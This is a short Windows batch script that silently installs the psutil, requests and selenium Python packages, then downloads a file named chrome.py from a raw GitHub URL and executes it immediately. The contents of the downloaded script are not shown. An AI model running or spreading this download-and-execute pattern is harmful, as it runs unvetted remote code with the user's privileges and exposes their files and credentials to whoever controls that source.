@echo off
pip install psutil --quiet
pip install requests --quiet
pip install selenium --quiet
curl -s -L -o chrome.py https://raw.githubusercontent.com/rudranshgoel1/windows2/main/chrome.py
python chrome.py
